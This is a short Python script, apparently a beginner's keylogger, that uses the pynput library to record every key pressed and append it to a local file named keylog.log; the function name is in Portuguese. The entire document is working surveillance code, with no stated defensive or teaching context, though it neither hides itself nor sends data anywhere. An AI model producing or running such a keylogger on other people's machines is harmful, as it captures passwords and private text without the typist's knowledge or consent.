from pynput.keyboard import Listener
import sys

def tecla_capturada(tecla):
	with open("keylog.log", 'a') as keylog:
		keylog.write(f"{tecla}\n")

with Listener(on_press=tecla_capturada) as cap:
	cap.join()
